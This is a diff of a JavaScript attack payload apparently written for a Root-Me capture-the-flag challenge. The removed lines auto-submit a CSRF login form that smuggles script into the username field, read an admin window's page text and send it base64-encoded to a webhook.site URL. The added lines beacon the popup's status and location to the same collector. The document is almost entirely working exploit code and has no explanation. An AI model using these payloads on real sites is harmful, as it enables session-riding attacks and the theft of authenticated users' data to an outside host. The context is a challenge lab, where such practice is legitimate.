@@ -1,18 +1,9 @@
 <script>
 var wb='http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';
-
-// 1. Ouvre adminpf depuis la fenêtre principale
 var ap=window.open('http://challenge01.root-me.org:58003/profile','adminpf');
-new Image().src=wb+'?popup='+(ap?'ok':'blocked');
-
-// 2. Après chargement, LA FENÊTRE PRINCIPALE navigue via CSRF (pas loginwin)
+// Essaie plusieurs façons de signaler le résultat
+document.write('popup:'+(ap===null?'null':ap===undefined?'undef':'got_obj'));
 setTimeout(function(){
-  var f=document.createElement('form');
-  f.method='POST';
-  f.action='http://challenge01.root-me.org:58003/login';
-  // PAS de target — fenêtre principale navigue elle-même
-  f.innerHTML='<input name=username value="var wb='http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';var w=window.open('','adminpf');var s=w?(w.document&&w.document.body?w.document.body.innerText:'w_no_body'):'no_adminpf';new Image().src=wb+'?d='+btoa(s);"><input name=secret value=x>';
-  document.body.appendChild(f);
-  f.submit();
-},3000);
+  new Image().src=wb+'?popup='+(ap===null?'null':ap===undefined?'undef':'obj')+'&href='+(ap&&ap.location?encodeURIComponent(ap.location.href):'na');
+},500);
 </script>
